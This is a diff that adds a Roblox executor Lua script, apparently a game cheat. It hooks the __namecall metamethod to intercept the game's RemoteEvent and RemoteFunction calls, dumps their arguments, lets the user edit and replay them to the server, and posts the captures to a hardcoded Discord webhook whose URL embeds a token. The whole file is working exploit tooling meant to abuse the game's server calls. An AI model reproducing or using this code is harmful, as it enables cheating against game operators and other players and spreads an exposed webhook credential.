@@ -1,0 +1,196 @@
+-- D8 scan + webhook
+local WEBHOOK = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
+
+local RS = game:GetService("ReplicatedStorage")
+local PL = game:GetService("Players").LocalPlayer
+local HS = game:GetService("HttpService")
+local unpack = table.unpack or unpack
+
+local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+print(req and "HTTP OK" or "KHONG CO HTTP - chi in console")
+
+local MAXLEN, MAXCAP, ARMTIME, MAXTOTAL = 96, 12, 25, 14000
+local store, count, buf, total, busy, armed, prev = {}, 0, {}, 0, false, false, nil
+
+local function deepcopy(v, seen)
+	seen = seen or {}
+	local tv = type(v)
+	if tv ~= "table" then return v end
+	if seen[v] then return seen[v] end
+	local o = {}
+	seen[v] = o
+	for k, x in pairs(v) do o[deepcopy(k, seen)] = deepcopy(x, seen) end
+	return o
+end
+
+local function hex(s)
+	local n = math.min(#s, MAXLEN)
+	local t = table.create(n)
+	for i = 1, n do t[i] = string.format("%02X", s:byte(i)) end
+	local o = table.concat(t, " ")
+	if #s > n then o ..= (" +%d"):format(#s - n) end
+	return o
+end
+
+local function asc(s)
+	return (s:sub(1, math.min(#s, MAXLEN)):gsub("[^\32-\126]", "."))
+end
+
+local function walk(v, path, out)
+	local tv = type(v)
+	if tv == "table" then
+		for k, x in pairs(v) do
+			walk(x, type(k) == "number" and (path .. "[" .. k .. "]") or (path .. "." .. tostring(k)), out)
+		end
+	elseif tv == "string" then
+		out[#out + 1] = ("%s len=%d HEX=%s ASC=%s"):format(path, #v, hex(v), asc(v))
+	elseif tv == "Instance" then
+		out[#out + 1] = ("%s Instance=%s"):format(path, v:GetFullName())
+	else
+		out[#out + 1] = ("%s %s=%s"):format(path, tv, tostring(v))
+	end
+end
+
+local remoteset, rpaths = {}, {}
+for _, d in ipairs(RS:GetDescendants()) do
+	if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
+		remoteset[d] = true
+		rpaths[#rpaths + 1] = (d:IsA("RemoteFunction") and "[RF] " or "[RE] ") .. d:GetFullName()
+	end
+end
+for _, d in ipairs(PL:GetDescendants()) do
+	if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
+		remoteset[d] = true
+		rpaths[#rpaths + 1] = (d:IsA("RemoteFunction") and "[RF] " or "[RE] ") .. d:GetFullName()
+	end
+end
+for _, d in ipairs(game:GetService("ReplicatedFirst"):GetDescendants()) do
+	if d:IsA("RemoteEvent") then
+		remoteset[d] = true
+		rpaths[#rpaths + 1] = "[RE] " .. d:GetFullName()
+	end
+end
+print(("quet duoc %d remote"):format(#rpaths))
+for i = 1, math.min(#rpaths, 60) do print(" " .. rpaths[i]) end
+
+local function post(content)
+	if not req then return end
+	local body = HS:JSONEncode({ content = content, username = "D8", allowed_mentions = { parse = {} } })
+	local ok, res = pcall(req, {
+		Url = WEBHOOK,
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json", ["User-Agent"] = "Mozilla/5.0" },
+		Body = body,
+	})
+	if not ok then print("post err " .. tostring(res))
+	elseif type(res) == "table" and tonumber(res.StatusCode) and res.StatusCode >= 400 then
+		print("http " .. res.StatusCode .. " " .. tostring(res.Body))
+	end
+end
+
+local function send(text)
+	if not WEBHOOK:match("^https://") then return print("chua co webhook") end
+	local head = ("**D8** `%s`\nplace=%s job=%s\nremotes=%d\n"):format(PL.Name, game.PlaceId, game.JobId, #rpaths)
+	local acc = head
+	for line in (text .. "\n"):gmatch("(.-)\n") do
+		if #acc + #line > 1850 then
+			post(acc)
+			task.wait(0.8)
+			acc = ""
+		end
+		acc ..= line .. "\n"
+	end
+	if #acc > 0 then post(acc) end
+end
+
+local function flush()
+	if #buf == 0 then return end
+	local text = table.concat(buf, "\n")
+	table.clear(buf)
+	if writefile then pcall(writefile, ("d8_%d.txt"):format(os.time()), text) end
+	send(text)
+end
+
+local function capture(inst, args)
+	local okp, err = pcall(function()
+		count += 1
+		local i = count
+		store[i] = { inst = inst, args = deepcopy(args) }
+		local out = { ("=== %d %s n=%d"):format(i, inst:GetFullName(), #args) }
+		for k = 1, #args do walk(args[k], "a" .. k, out) end
+		local block = table.concat(out, "\n")
+		buf[#buf + 1] = block
+		total += #block
+		print(block)
+	end)
+	if not okp then print("CAP ERR " .. tostring(err)) end
+	if count >= MAXCAP or total >= MAXTOTAL then disarm() end
+end
+
+local function disarm()
+	if not armed then return end
+	armed = false
+	print(("ARM OFF cap=%d - _flush() _d(i) _r(i)"):format(count))
+	task.spawn(function()
+		task.wait(0.5)
+		flush()
+	end)
+end
+
+local function arm()
+	if armed or not prev then return end
+	armed = true
+	print("ARMED 25s - claim ngay")
+	task.delay(ARMTIME, disarm)
+end
+
+prev = hookmetamethod(game, "__namecall", function(self, ...)
+	local known = remoteset[self]
+	if not known and not self:IsA("RemoteEvent") then return prev(self, ...) end
+	if not armed or busy then return prev(self, ...) end
+	local m = getnamecallmethod()
+	if m ~= "FireServer" and m ~= "InvokeServer" then return prev(self, ...) end
+	capture(self, { ... })
+	return prev(self, ...)
+end)
+
+local function r(i)
+	local rec = store[tonumber(i) or 0]
+	if not rec then return print("khong co") end
+	busy = true
+	local ok, err = pcall(function()
+		if rec.inst:IsA("RemoteFunction") then rec.inst:InvokeServer(unpack(rec.args))
+		else rec.inst:FireServer(unpack(rec.args)) end
+	end)
+	busy = false
+	print(ok and "replay ok" or ("replay err " .. tostring(err)))
+end
+
+local function d(i)
+	local rec = store[tonumber(i) or 0]
+	if not rec then return print("khong co") end
+	local out = { ("=== %d"):format(i) }
+	for k = 1, #rec.args do walk(rec.args[k], "a" .. k, out) end
+	print(table.concat(out, "\n"))
+end
+
+local function s(i, f, v)
+	local rec = store[tonumber(i) or 0]
+	if not rec or not rec.args[1] then return print("khong co") end
+	rec.args[1][tonumber(f) or 0] = v
+	print("ok")
+end
+
+local function kill()
+	armed = false
+	pcall(function() hookmetamethod(game, "__namecall", prev) end)
+	print("HOOK GO")
+end
+
+getgenv()._flush, getgenv()._d, getgenv()._s, getgenv()._r, getgenv()._arm, getgenv()._stop = flush, d, s, r, arm, kill
+getgenv()._hook = function(u) WEBHOOK = u; print("hook set") end
+getgenv()._test = function() post("**D8 alive** place=" .. game.PlaceId .. " user=" .. PL.Name) end
+
+_test()
+task.wait(1.2)
+arm()
